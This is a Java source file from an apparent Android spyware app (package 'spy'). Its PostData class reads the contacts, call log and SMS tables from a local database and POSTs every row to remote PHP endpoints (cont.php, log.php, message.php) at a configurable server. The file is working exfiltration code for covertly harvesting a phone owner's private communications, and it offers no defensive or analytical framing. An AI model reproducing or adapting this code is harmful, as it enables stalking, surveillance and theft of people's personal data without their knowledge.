package com.example.subhasis.spy;


import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.AsyncTask;
import android.util.Log;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;



enum PStatus {IDLE,PROCESSING,NOT_INITIALIZED,FAILD_OR_EMPTY,OK}

class PostData extends AsyncTask<String,Void,String> {

    private static final String TAG = "PostData";
    public static int c=0;
    private URL url;
    private PStatus mStatus;

    public PostData() {
        mStatus=PStatus.IDLE;
    }

    @Override
    protected void onPostExecute(String s) {
        super.onPostExecute(s);
    }

    @Override
    protected String doInBackground(String... params) {


        HttpURLConnection connections =null;
        BufferedReader reader= null;
//        JSONObject js1 = new JSONObject(),js2 = new JSONObject();

        if(params == null){
            mStatus=PStatus.NOT_INITIALIZED;
            return null;

        }
        try {

//            js1.put("CONTACT", jsonArr.getResults("contacts"));
//            js2.put("SMS",jsonArr.getResults("SMS"));
            String myPath = "/data/data/com.example.subhasis.spy/databases/upload.db";// Set path to your database

            String myTable1 = "contacts";//Set name of your table
            String myTable2 = "call_logs";
            String myTable3 = "messages";

            String colConten = "";


            //or you can use `context.getDatabasePath("my_db_test.db")`

            String searchQuery;
            Cursor cursor = null;
            SQLiteDatabase myDataBase = SQLiteDatabase.openDatabase(myPath, null, SQLiteDatabase.OPEN_READONLY);
            mStatus = PStatus.PROCESSING;
            if(Integer.parseInt(params[1]) == 1) {

                url = new URL(params[0] + "cont.php");//contacts




                searchQuery = "SELECT  * FROM " + myTable1;
                cursor = myDataBase.rawQuery(searchQuery, null);

                cursor.moveToFirst();
                while (cursor.isAfterLast() == false) {
                    connections = (HttpURLConnection) url.openConnection();
//            Log.e(TAG, "doInBackground: "+js1.toString()+"\n"+js2.toString() );
                    connections.setReadTimeout(200000);
                    connections.setConnectTimeout(200000);

                    connections.setRequestMethod("POST");
                    connections.setDoOutput(true);
                    OutputStream os = connections.getOutputStream();
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));

                    int totalColumn = cursor.getColumnCount();
                    StringBuilder result = new StringBuilder();

//                result.append(URLEncoder.encode("code", "UTF-8"));
//                result.append("=");
//                result.append(URLEncoder.encode("1", "UTF-8"));
//                result.append("&");

                    for (int i = 0; i < totalColumn; i++) {

                        if (cursor.getColumnName(i) != null) {
                            try {
                                if (cursor.getString(i) != null) {
//                                Log.d("TAG_NAME", cursor.getString(i));
                                    result.append(URLEncoder.encode(cursor.getColumnName(i), "UTF-8"));
                                    result.append("=");
                                    result.append(URLEncoder.encode(cursor.getString(i), "UTF-8"));
                                    if (cursor.isAfterLast() == false) {
                                        result.append("&");

                                    } else {
                                        Log.d(TAG, "getPostDataString: Contact uploaded");

                                    }

                                }

                            } catch (Exception e) {
                                Log.d("TAG_NAME", e.getMessage());
                            }
                        }
                    }

                    writer.write(result.toString());
                    writer.flush();
                    writer.close();
                    os.close();
                    Log.d(TAG, "doInBackground: STRING writen into PHP " + result.toString());

                    cursor.moveToNext();
                    int responsecode = connections.getResponseCode();

                    if (responsecode == HttpURLConnection.HTTP_OK) {
                        Log.d(TAG, "doInBackground: ADDED");
                        BufferedReader in = new BufferedReader(new InputStreamReader(connections.getInputStream()));
                        StringBuffer sb = new StringBuffer("");
                        String line = "";

                        while ((line = in.readLine()) != null) {
                            sb.append(line);
                            break;
                        }
                        in.close();
                    }

                }
                cursor.close();
            }


          //call logs started
            else if(Integer.parseInt(params[1]) == 2) {
                url = new URL(params[0] + "log.php");
                searchQuery = "SELECT  * FROM " + myTable2;
                cursor = myDataBase.rawQuery(searchQuery, null);


                cursor.moveToFirst();
                while (cursor.isAfterLast() == false) {
                    connections = (HttpURLConnection) url.openConnection();
//            Log.e(TAG, "doInBackground: "+js1.toString()+"\n"+js2.toString() );
                    connections.setReadTimeout(20000);
                    connections.setConnectTimeout(20000);

                    connections.setRequestMethod("POST");
                    connections.setDoOutput(true);
                    OutputStream os = connections.getOutputStream();
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));

                    int totalColumn = cursor.getColumnCount();
                    StringBuilder result = new StringBuilder();

//                result.append(URLEncoder.encode("code", "UTF-8"));
//                result.append("=");
//                result.append(URLEncoder.encode("2", "UTF-8"));
//                result.append("&");

                    for (int i = 0; i < totalColumn; i++) {

                        if (cursor.getColumnName(i) != null) {
                            try {
                                if (cursor.getString(i) != null) {
//                                Log.d("TAG_NAME", cursor.getString(i));
                                    result.append(URLEncoder.encode(cursor.getColumnName(i), "UTF-8"));
                                    result.append("=");
                                    result.append(URLEncoder.encode(cursor.getString(i), "UTF-8"));
                                    if (cursor.isAfterLast() == false) {
                                        result.append("&");

                                    } else {
                                        Log.d(TAG, "getPostDataString: SMS uploaded");

                                    }

                                }

                            } catch (Exception e) {
                                Log.d("TAG_NAME", e.getMessage());
                            }
                        }
                    }

                    writer.write(result.toString());
                    writer.flush();
                    writer.close();
                    os.close();
                    Log.d(TAG, "doInBackground: STRING writen into PHP" + result.toString());

                    cursor.moveToNext();
                    int responsecode = connections.getResponseCode();

                    if (responsecode == HttpURLConnection.HTTP_OK) {
                        BufferedReader in = new BufferedReader(new InputStreamReader(connections.getInputStream()));
                        StringBuffer sb = new StringBuffer("");
                        String line = "";

                        while ((line = in.readLine()) != null) {
                            sb.append(line);
                            break;
                        }
                        in.close();
                    }

                }
                cursor.close();
            }

            //messages started

            else if(Integer.parseInt(params[1]) == 3) {
                url = new URL(params[0] + "message.php");
                searchQuery = "SELECT  * FROM " + myTable3;
                cursor = myDataBase.rawQuery(searchQuery, null);


                cursor.moveToFirst();
                while (cursor.isAfterLast() == false) {
                    connections = (HttpURLConnection) url.openConnection();
//            Log.e(TAG, "doInBackground: "+js1.toString()+"\n"+js2.toString() );
                    connections.setReadTimeout(20000);
                    connections.setConnectTimeout(20000);

                    connections.setRequestMethod("POST");
                    connections.setDoOutput(true);
                    OutputStream os = connections.getOutputStream();
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));

                    int totalColumn = cursor.getColumnCount();
                    StringBuilder result = new StringBuilder();

//                result.append(URLEncoder.encode("code", "UTF-8"));
//                result.append("=");
//                result.append(URLEncoder.encode("2", "UTF-8"));
//                result.append("&");

                    for (int i = 0; i < totalColumn; i++) {

                        if (cursor.getColumnName(i) != null) {
                            try {
                                if (cursor.getString(i) != null) {
//                                Log.d("TAG_NAME", cursor.getString(i));
                                    result.append(URLEncoder.encode(cursor.getColumnName(i), "UTF-8"));
                                    result.append("=");
                                    result.append(URLEncoder.encode(cursor.getString(i), "UTF-8"));
                                    if (cursor.isAfterLast() == false) {
                                        result.append("&");

                                    } else {
                                        Log.d(TAG, "getPostDataString: SMS uploaded");

                                    }

                                }

                            } catch (Exception e) {
                                Log.d("TAG_NAME", e.getMessage());
                            }
                        }
                    }

                    writer.write(result.toString());
                    writer.flush();
                    writer.close();
                    os.close();
                    Log.d(TAG, "doInBackground: STRING writen into PHP" + result.toString());

                    cursor.moveToNext();
                    int responsecode = connections.getResponseCode();

                    if (responsecode == HttpURLConnection.HTTP_OK) {
                        BufferedReader in = new BufferedReader(new InputStreamReader(connections.getInputStream()));
                        StringBuffer sb = new StringBuffer("");
                        String line = "";

                        while ((line = in.readLine()) != null) {
                            sb.append(line);
                            break;
                        }
                        in.close();
                    }

                }
                cursor.close();
            }
            myDataBase.close();


        }catch (MalformedURLException e){
            Log.e(TAG, "doInBackground: Wrong URL"+e.getMessage() );
        }catch (IOException e){
            Log.e(TAG, "doInBackground: IOexception "+e.getMessage() );
        }
        catch (SecurityException e){
            Log.e(TAG, "doInBackground: "+e.getMessage() );
        }
        catch (Exception e){
            Log.e(TAG, "doInBackground: Rest of the errors"+e.getMessage() );
        }
        finally {
            try {

                reader.close();
            }catch (IOException e){
                Log.e(TAG, "doInBackground: "+e.getMessage() );
            }catch (NullPointerException e){
                Log.e(TAG, "doInBackground: null pointer "+e.getMessage() );
            }
        }


        return null;
    }
//    public String getPostDataString(String sArr,String s) throws Exception {
//
//        c++;
//
//        StringBuilder result = new StringBuilder();
//
//
//            result.append(URLEncoder.encode(s, "UTF-8"));
//            result.append("=");
//            result.append(URLEncoder.encode(sArr, "UTF-8"));
//
//
////        if(c==1) {
////            result.append("&");
////            Log.d(TAG, "getPostDataString: Contact uploaded");
////         }
////        else {
////            c = 0;
////            Log.d(TAG, "getPostDataString: SMS uploaded");
////        }
////            result.append(URLEncoder.encode("SMS", "UTF-8"));
////            result.append("=");
////            result.append(URLEncoder.encode(obj2.toString(), "UTF-8"));
//
//        return result.toString();
//    }
//
}




